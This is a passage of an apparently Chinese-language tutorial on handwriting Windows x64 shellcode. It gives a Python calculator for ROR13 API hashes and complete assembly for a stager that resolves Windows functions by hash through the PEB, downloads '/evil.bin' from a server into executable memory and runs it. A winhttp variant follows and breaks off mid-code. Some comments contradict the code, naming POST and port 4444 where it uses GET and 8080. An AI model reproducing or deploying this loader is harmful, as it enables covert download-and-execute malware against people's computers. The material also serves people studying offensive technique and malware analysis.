class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br></pre></td><td class="code"><pre><code class="hljs assembly">def ror32(value, bits):<br>    &quot;&quot;&quot;对32位整数执行循环右移&quot;&quot;&quot;<br>    return ((value &gt;&gt; bits) | (value &lt;&lt; (32 - bits))) &amp; 0xFFFFFFFF<br><br><br>def hash_module(module_name: str) -&gt; int:<br>    &quot;&quot;&quot;<br>    模块名哈希算法（等价于汇编）<br>    示例：kernel32.dll -&gt; 模块hash<br>    &quot;&quot;&quot;<br>    module_name = module_name.upper()  # 转大写<br>    print(module_name)<br>    h = 0<br>    for ch in module_name:<br>        h = ror32(h, 13)<br>        h = (h + ord(ch)) &amp; 0xFFFFFFFF<br>        h = ror32(h, 13)<br>    return h<br><br><br>def hash_function(module_name: str, func_name: str) -&gt; int:<br>    &quot;&quot;&quot;<br>    函数hash = 函数名hash + 模块hash<br>    &quot;&quot;&quot;<br>    module_hash = hash_module(module_name)<br>    h = 0<br>    for ch in func_name:<br>        h = ror32(h, 13)<br>        h = (h + ord(ch)) &amp; 0xFFFFFFFF<br>    h = ror32(h, 13)<br>    final_hash = (h + module_hash) &amp; 0xFFFFFFFF<br>    return final_hash<br><br>if __name__ == &quot;__main__&quot;:<br>    print(&quot;Windows API Hash 计算器&quot;)<br>    print(&quot;=&quot; * 60)<br>    print(&quot;输入 &#x27;q&#x27; 或 &#x27;quit&#x27; 退出程序&quot;)<br>    print()<br><br>    while True:<br>        try:<br>            # 获取模块名<br>            mod = input(&quot;请输入模块名称 (例如: kernel32.dll): &quot;).strip()<br>            if mod.lower() in [&#x27;q&#x27;, &#x27;quit&#x27;, &#x27;exit&#x27;]:<br>                print(&quot;退出程序&quot;)<br>                break<br><br>            if not mod:<br>                print(&quot;模块名称不能为空！\n&quot;)<br>                continue<br><br>            # 获取函数名<br>            func = input(&quot;请输入函数名称 (例如: LoadLibraryA): &quot;).strip()<br>            if func.lower() in [&#x27;q&#x27;, &#x27;quit&#x27;, &#x27;exit&#x27;]:<br>                print(&quot;退出程序&quot;)<br>                break<br><br>            if not func:<br>                print(&quot;函数名称不能为空！\n&quot;)<br>                continue<br><br>            # 计算并显示哈希值<br>            hash_value = hash_function(mod, func)<br>            print()<br>            print(f&quot;组合: &#123;mod&#125; + &#123;func&#125;&quot;)<br>            print(f&quot;组合Hash = 0x&#123;hash_value:08X&#125;&quot;)<br>            print(&quot;-&quot; * 60)<br>            print()<br><br>        except KeyboardInterrupt:<br>            print(&quot;\n\n程序被用户中断&quot;)<br>            break<br>        except Exception as e:<br>            print(f&quot;发生错误: &#123;e&#125;&quot;)<br>            print(&quot;请重试...\n&quot;)<br>.code<br><br>main proc<br>    cld<br>    and rsp, 0FFFFFFFFFFFFFFF0h           <br>load_wininet:<br>    push 0<br>    mov r14, &#x27;teniniw&#x27;      ; 将字节 &#x27;wininet&#x27;,0 压入栈中<br>    push r14                ; 保存指向 &quot;wininet&quot; 字符串的指针，用于 LoadLibraryA 调用<br>    mov r14, rsp            <br>    mov rcx, r14            ; 设置要加载的库的参数<br>    mov r10, 0DEC21CCDh     ; hash( &quot;kernel32.dll&quot;, &quot;LoadLibraryA&quot; )<br>    call GetProcAddressByHash   ; LoadLibraryA(&quot;wininet&quot;)<br><br>internetopen:<br>    xor rcx, rcx           ; LPCTSTR lpszAgent (NULL)<br>    xor rdx, rdx           ; DWORD dwAccessType (PRECONFIG = 0)<br>    xor r8, r8             ; LPCTSTR lpszProxyName<br>    xor r9, r9             ; LPCTSTR lpszProxyBypass<br>    push r8                ; DWORD dwFlags<br>    push r8                ; 对齐<br>    mov r10, 0363799Dh    ; hash( &quot;wininet.dll&quot;, &quot;InternetOpenA&quot; )<br>    call GetProcAddressByHash   ; InternetOpenA(NULL, PRECONFIG, NULL, NULL, 0)<br><br>    jmp dbl_get_server_host<br><br>internetconnect:<br>    pop rdx                ; LPCTSTR lpszServerName 弹出返回地址，直接获取到服务器主机名<br>    mov rcx, rax           ; HINTERNET hInternet<br>    mov r8, 8080           ; PORT<br>    xor r9, r9             ; LPCTSTR lpszUsername<br>    push r9                ; DWORD_PTR dwContext (NULL)<br>    push r9                ; DWORD dwFlags<br>    push 3                 ; DWORD dwService (INTERNET_SERVICE_HTTP)<br>    push r9                ; alignment<br>    mov r10, 2289ACBAh    ; hash( &quot;wininet.dll&quot;, &quot;InternetConnectA&quot; )<br>    call GetProcAddressByHash   ; InternetConnectA(hInternet, &quot;4444&quot;, NULL, NULL, 0, INTERNET_SERVICE_HTTP, 0, 0)<br><br>    jmp get_server_uri<br><br>get_server_uri:<br>    call get_http_method<br><br>server_uri:<br>    db &quot;/evil.bin&quot;, 0<br><br>get_http_method:<br>    call get_http_version<br><br>http_method:<br>    db &quot;GET&quot;, 0<br><br>get_http_version:<br>    call httpopenrequest<br><br>http_version:<br>    db &quot;HTTP/1.1&quot;, 0<br><br>httpopenrequest:<br>    pop r9                 ; LPCTSTR lpszVersion (弹出 &quot;HTTP/1.1&quot;)<br>    pop rdx                ; LPCTSTR lpszVerb (弹出 &quot;POST&quot;)<br>    pop r8                 ; LPCTSTR lpszObjectName (弹出 &quot;/evil.bin&quot;)<br>    mov rcx, rax           ; HINTERNET hConnect<br>    push 0                 ; DWORD_PTR dwContext (NULL)<br>    push 80000000h         ; DWORD dwFlags<br>    push 0                 ; LPCTSTR *lplpszAcceptTypes (NULL)<br>    push 0                 ; LPCTSTR lpszReferer (NULL)<br>    mov r10, 9718794Eh     ; hash( &quot;wininet.dll&quot;, &quot;HttpOpenRequestA&quot; )<br>    call GetProcAddressByHash   ; HttpOpenRequestA(hConnect, &quot;POST&quot;, &quot;/evil.bin&quot;, &quot;HTTP/1.1&quot;, NULL, NULL, INTERNET_FLAG_RELOAD | INTERNET_NO_CACHE_WRITE | INTERNET_FLAG_SECURE | INTERNET_FLAG_NO_AUTO_REDIRECT | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_NO_UI, NULL)<br>    mov rsi, rax<br><br>internetsetoption:<br>    mov rcx, rsi           ; HINTERNET hInternet<br>    mov rdx, 31            ; DWORD dwOption (INTERNET_OPTION_SECURITY_FLAGS)<br>    push 0            ; 对齐<br>    push 3380h<br>    mov r8, rsp<br>    mov r9, 4              ; sizeof(dwFlags)<br>    mov r10, 0E28869D8h    ; hash( &quot;wininet.dll&quot;, &quot;InternetSetOptionA&quot; )<br>    call GetProcAddressByHash   ; InternetSetOptionA(hInternet, INTERNET_OPTION_SECURITY_FLAGS, &amp;dwFlags, sizeof (dwFlags) )<br><br>httpsendrequest:<br>    mov rcx, rsi           ; HINTERNET hRequest<br>    xor rdx, rdx           ; LPCTSTR lpszHeaders<br>    xor r8, r8             ; DWORD dwHeadersLength<br>    xor r9, r9             ; LPVOID lpOptional<br>    push rdx               ; 对齐<br>    push rdx               ; DWORD dwOptionalLength<br>    mov r10, 0D7022990h    ; hash( &quot;wininet.dll&quot;, &quot;HttpSendRequestA&quot; )<br>    call GetProcAddressByHash   ; HttpSendRequestA(hRequest, NULL, NULL, 0, NULL, 0, 0, 0)<br>    test eax,eax<br>    jnz short allocate_memory<br>    jmp try_it_again<br><br>try_it_again:<br>    dec rdi<br>    jz failure<br>    jmp short internetsetoption<br><br>failure:<br>    mov r10, 2E3E5B71h    ; hash( &quot;kernel32.dll&quot;, &quot;ExitProcess&quot; )<br>    call GetProcAddressByHash   ; ExitProcess(0)<br><br>allocate_memory:<br>    xor rcx, rcx           ; LPVOID lpAddress<br>    mov rdx, 00400000h    ; SIZE_T dwSize<br>    mov r8, 1000h         ; DWORD flAllocationType(MEM_COMMIT)<br>    mov r9, 40h           ; DWORD flProtect(PAGE_EXECUTE_READWRITE)<br>    mov r10, 0BCEF49D9h    ; hash( &quot;kernel32.dll&quot;, &quot;VirtualAlloc&quot; )<br>    call GetProcAddressByHash   ; VirtualAlloc(NULL, 0x400000, MEM_COMMIT, PAGE_EXECUTE_READWRITE)<br><br>download_prep:<br>    xchg rax, rbx          ; 将分配的基础地址放在 ebx 中<br>    push rbx               ; 在栈上存储阶段基础地址的副本<br>    push rbx               ; 读取字节数的临时存储<br>    mov rdi, rsp           ; &amp;bytesRead<br><br>download_more:<br>    mov rcx, rsi           ; HINTERNET hFile<br>    mov rdx, rbx           ; LPVOID lpBuffer<br>    mov r8, 8192           ; DWORD dwNumberOfBytesToRead<br>    mov r9, rdi            ; LPDWORD lpdwNumberOfBytesRead<br>    mov r10, 3E73B975h    ; hash( &quot;wininet.dll&quot;, &quot;InternetReadFile&quot; )<br>    call GetProcAddressByHash   ; InternetReadFile(hFile, lpBuffer, dwNumberOfBytesToRead, lpdwNumberOfBytesRead)<br>    add rsp, 32            ; 清理保留空间<br>    test eax,eax<br>    jz failure<br>    mov ax, word ptr [rdi]<br>    add rbx, rax           ; buffer += bytes_received<br>    test rax,rax<br>    jnz download_more<br>    pop rax<br>    pop rax<br>    jmp execute_stage<br><br>execute_stage:<br>    ret<br><br>dbl_get_server_host:        ; 双重跳转(突破跳转距离限制)到获取服务器主机名<br>    jmp get_server_host<br><br>get_server_host:            ; 后接server_host<br>    call internetconnect<br><br>server_host:<br>    db &#x27;127.0.0.1&#x27;, 0<br><br>GetProcAddressByHash:<br>    push r9                     ; 保存第4个参数<br>    push r8                     ; 保存第3个参数<br>    push rdx                    ; 保存第2个参数<br>    push rcx                    ; 保存第1个参数<br>    push rsi                    ; 保存 RSI<br>    xor rdx, rdx                ; 清零 rdx<br>    mov rdx, gs:[rdx+60h]      ; 获取 PEB 的指针<br>    mov rdx, [rdx+18h]         ; 获取 PEB-&gt;Ldr<br>    mov rdx, [rdx+20h]         ; 从 InMemoryOrder 模块列表中获取第一个模块<br><br>; 获取下一个模块名称和长度<br>next_mod:                     ;<br>    mov rsi, [rdx+50h]         ; 获取模块名称的指针 (unicode 字符串)<br>    movzx rcx, word ptr [rdx+48h]  ; 将 rcx 设置为我们要检查的长度<br>    xor r9, r9                  ; 清零 r9，它将存储模块名称的哈希值<br><br>loop_modname:                 ;<br>    xor rax, rax                ; 清零 rax<br>    lodsb                       ; 读取名称的下一个字节<br>    cmp al, &#x27;a&#x27;                 ; 某些版本的 Windows 使用小写模块名称<br>    jl not_lowercase            ;<br>    sub al, 20h                ; 如果是，则标准化为大写<br>not_lowercase:                ;<br>    ror r9d, 0dh                ; 对r9 的低32位进行循环右移13位，不影响高32位<br>    add r9d, eax                ; 添加名称的下一个字节<br>    loop loop_modname           ; 循环直到我们读取足够的数据<br>    ; 现在我们已经计算了模块哈希<br>    push rdx                    ; 保存模块列表中的当前位置，供后续使用<br>    push r9                     ; 保存当前模块哈希，供后续使用<br>    ; 继续遍历导出地址表<br>    mov rdx, [rdx+20h]         ; 获取此模块的基地址<br>    mov eax, dword ptr [rdx+3ch]   ; 获取 PE 头<br>    add rax, rdx                ; 添加模块的基地址<br>    cmp word ptr [rax+18h], 020Bh ; 这个模块实际上是 PE64 可执行文件吗？<br>    ; 这个测试用例涵盖了在 wow64 上运行但在通过 nativex64.asm 的原生 x64 上下文中的情况<br>    ; 在 PEB 的模块列表中可能存在 PE32 模块（通常是主模块）<br>    ; 由于我们使用的是 win64 PEB ([gs:96])，我们不会看到 win32 PEB ([fs:48]) 中存在的 wow64 模块<br>    jne get_next_mod1           ; 如果不是，继续处理下一个模块<br>    mov eax, dword ptr [rax+88h]   ; 获取导出表的 RVA<br>    test rax, rax               ; 测试是否没有导出地址表<br>    jz get_next_mod1            ; 如果没有 EAT，处理下一个模块<br>    add rax, rdx                ; 添加模块的基地址<br>    push rax                    ; 保存当前模块的 EAT<br>    mov ecx, dword ptr [rax+18h]   ; 获取函数名称的数量<br>    mov r8d, dword ptr [rax+20h]   ; 获取函数名称的 rva<br>    add r8, rdx                 ; 添加模块的基地址<br>    ; 计算模块哈希 + 函数哈希<br>get_next_func:                ;<br>    jrcxz get_next_mod          ; 当我们到达 EAT 的开始（我们向后搜索）时，处理下一个模块<br>    dec rcx                     ; 递减函数名称计数器<br>    mov esi, dword ptr [r8+rcx*4]; 获取下一个模块名称的 rva<br>    add rsi, rdx                ; 添加模块的基地址<br>    xor r9, r9                  ; 清零 r9，它将存储函数名称的哈希值<br>    ; 并将其与我们想要的进行比较<br>loop_funcname:                ;<br>    xor rax, rax                ; 清零 rax<br>    lodsb                       ; 读取 ASCII 函数名称的下一个字节<br>    ror r9d, 0dh                ; 右旋转我们的哈希值<br>    add r9d, eax                ; 添加名称的下一个字节<br>    cmp al, ah                  ; 将 AL（名称的下一个字节）与 AH（null）进行比较<br>    jne loop_funcname           ; 如果我们没有到达 null 终止符，继续<br>    add r9, [rsp+8]             ; 将当前模块哈希添加到函数哈希<br>    cmp r9d, r10d               ; 将哈希与我们正在搜索的进行比较<br>    jnz get_next_func           ; 如果没有找到，去计算下一个函数哈希<br>    ; 如果找到，修复栈，调用函数，然后计算下一个...<br>    pop rax                     ; 恢复当前模块的 EAT<br>    mov r8d, dword ptr [rax+24h]   ; 获取序数表的 rva<br>    add r8, rdx                 ; 添加模块的基地址<br>    mov cx, [r8+2*rcx]        ; 获取所需函数的序数<br>    mov r8d, dword ptr [rax+1ch]   ; 获取函数地址表的 rva<br>    add r8, rdx                 ; 添加模块的基地址<br>    mov eax, dword ptr [r8+4*rcx] ; 获取所需函数的 RVA<br>    add rax, rdx                ; 添加模块的基地址以获取函数的实际 VA<br>    ; 我们现在修复栈并执行对所需函数的调用...<br>finish:<br>    pop r8                      ; 清除当前模块的哈希<br>    pop r8                      ; 清除模块列表中的当前位置<br>    pop rsi                     ; 恢复 RSI<br>    pop rcx                     ; 恢复第1个参数<br>    pop rdx                     ; 恢复第2个参数<br>    pop r8                      ; 恢复第3个参数<br>    pop r9                      ; 恢复第4个参数<br>    pop r10                     ; 弹出返回地址<br>    sub rsp, 20h               ; 为四个寄存器参数保留空间 (4 * sizeof(QWORD) = 0x20)<br>                                ; 如果需要，调用者有责任恢复 RSP（或分配更多空间或对齐 RSP）<br>    push r10                    ; 压回返回地址<br>    jmp rax                     ; 跳转到所需的函数<br>    ; 我们现在自动返回到正确的调用者...<br>get_next_mod:                 ;<br>    pop rax                     ; 弹出当前（现在是前一个）模块的 EAT<br>get_next_mod1:                ;<br>    pop r9                      ; 弹出当前（现在是前一个）模块的哈希<br>    pop rdx                     ; 恢复我们在模块列表中的位置<br>    mov rdx, [rdx]              ; 获取下一个模块<br>    jmp next_mod                ; 处理这个模块<br><br>main endp<br>end<br></code></pre></td></tr></table></figure>



<h2 id="5-5-纯汇编远程-shellcode（winhttp）"><a href="#5-5-纯汇编远程-shellcode（winhttp）" class="headerlink" title="5.5 纯汇编远程 shellcode（winhttp）"></a>5.5 纯汇编远程 shellcode（winhttp）</h2><p>如果已经真的自己研究过上面的几个纯汇编手写 shellcode 的话，到这个应该也就不难写了，对着 cpp 的实现去写就 ok 了，或者直接拿之前的对着 cpp 的实现去改；</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.code<br><br>main proc<br>    cld<br>    and rsp, 0FFFFFFFFFFFFFFF0h           <br>load_winhttp:<br>    mov r14, &#x27;lld&#x27; <br>    push r14<br>    mov r14, &#x27;.ptthniw&#x27;      ; 将字节 &#x27;winhttp.dll&#x27;,0 压入栈中<br>    push r14                ; 保存指向 &quot;winhttp.dll&quot; 字符串的指针，用于 LoadLibraryA 调用<br>    mov r14, rsp            <br>    mov rcx, r14            ; 设置要加载的库的参数<br>    mov r10, 0DEC21CCDh     ; hash( &quot;kernel32.dll&quot;, &quot;LoadLibraryA&quot; )<br>    call GetProcAddressByHash   ; LoadLibraryA(&quot;winhttp.dll&quot;)<br>WinHttpOpen:<br>    mov rdi, 3             ; 初始化重试计数器 (最多重试3次)<br>    xor rcx, rcx           ; LPCWSTR pszAgentW (NULL - 默认用户代理)<br>    mov rdx, 1             ; DWORD dwAccessType (1 = WINHTTP_ACCESS_TYPE_NO_PROXY)<br>    xor r8, r8             ; LPCWSTR pszProxyW (NULL)<br>    xor r9, r9             ; LPCWSTR pszProxyBypassW (NULL)<br>    push 0                 ; 对齐   <br>    push r9                ; DWORD dwFlags (0 = 同步模式)<br>    mov r10, 332D226Eh     ; hash( &quot;winhttp.dll&quot;, &quot;WinHttpOpen&quot; )<br>    call GetProcAddressByHash   ; WinHttpOpen(NULL, WINHTTP_ACCESS_TYPE_NO_PROXY, NULL, NULL, 0)<br>    <br>    jmp dbl_get_server_host<br><br>dbl_get_server_host:        ; 双重跳转(突破跳转距离限制)到获取服务器主机名<br>    jmp get_server_host<br><br>get_server_host:            ; 后接server_host<br>    call WinHttpConnect<br><br>server_host:<br>    db &#x27;1&#x27;, 0, &#x27;2&#x27;, 0, &#x27;7&#x27;, 0, &#x27;.&#x27;, 0, &#x27;0&#x27;, 0, &#x27;.&#x27;, 0, &#x27;0&#x27;, 0, &#x27;.&#x27;, 0, &#x27;1&#x27;, 0, 0, 0  ; Unicode 宽字符串<br><br>WinHttpConnect:<br>    pop rdx                ; LPCTSTR pswzServerName 弹出返回地址，直接获取到服务器主机名<br>    mov rcx, rax           ; HINTERNET hSession<br>    mov r8, 8080           ; INTERNET_PORT nServerPort<br>    xor r9, r9             ; DWORD dwReserved (NULL)<br>    mov r10, 39AE9EB0h    ; hash( &quot;winhttp.dll&quot;, &quot;WinHttpConnect&quot; )<br>    call GetProcAddressByHash   ; WinHttpConnect(hSession, IP, 8080, 0)<br><br>    jmp get_server_uri<br><br>get_server_uri:<br>    call get_http_method<br><br>server_uri:<br>    db &#x27;/&#x27;, 0, &#x27;e&#x27;, 0, &#x27;v&#x27;, 0, &#x27;i&#x27;, 0, &#x27;l&#x27;, 0, &#x27;.&#x27;, 0, &#x27;b&#x27;, 0, &#x27;i&#x27;, 0, &#x27;n&#x27;, 0, 0, 0  ; Unicode 宽字符串<br><br>get_http_method:<br>    call get_http_version<br><br>http_method:<br>    db &#x27;G&#x27;, 0, &#x27;E&#x27;, 0, &#x27;T&#x27;, 0, 0, 0  ; Unicode 宽字符串<br><br>get_http_version:<br>    call WinHttpOpenRequest<br><br>http_version:<br>    db &#x27;H&#x27;, 0, &#x27;T&#x27;, 0, &#x27;T&#x27;, 0, &#x27;P&#x27;, 0, &#x27;/&#x27;, 0, &#x27;1&#x27;, 0, &#x27;.&#x27;, 0, &#x27;1&#x27;, 0, 0, 0  ; Unicode 宽字符串<br><br>WinHttpOpenRequest:<br>    pop r9                 ; LPCWSTR pwszVersion (弹出 &quot;HTTP/1.1&quot;)<br>    pop rdx                ; LPCWSTR pwszVerb (弹出 &quot;GET&quot;)<br>    pop r8                 ; LPCWSTR pwszObjectName (弹出 &quot;/evil.bin&quot;)<br>    mov rcx, rax           ; HINTERNET hConnect<br>    push 0                 ; 对齐<br>    push 0                 ; DWORD dwFlags (0)<br>    push 0                 ; LPCTSTR *ppwszAcceptTypes (NULL)<br>    push 0                 ; LPCTSTR pwszReferrer (NULL)<br>    mov r10, 0D3431402h     ; hash( &quot;winhttp.dll&quot;, &quot;WinHttpOpenRequest&quot; )<br>    call GetProcAddressByHash   ; WinHttpOpenRequest(hConnect, &quot;GET&quot;, &quot;/evil.bin&quot;, &quot;HTTP/1.1&quot;, NULL, NULL, 0);<br>    mov rsi, rax<br><br>WinHttpSendRequest:<br>    mov rcx, rsi           ; HINTERNET hRequest<br>    xor rdx, rdx           ; LPCWSTR lpszHeaders<br>    xor r8, r8             ; DWORD dwHeadersLength<br>    xor r9, r9             ; LPVOID lpOptional<br>    push 0                 ; 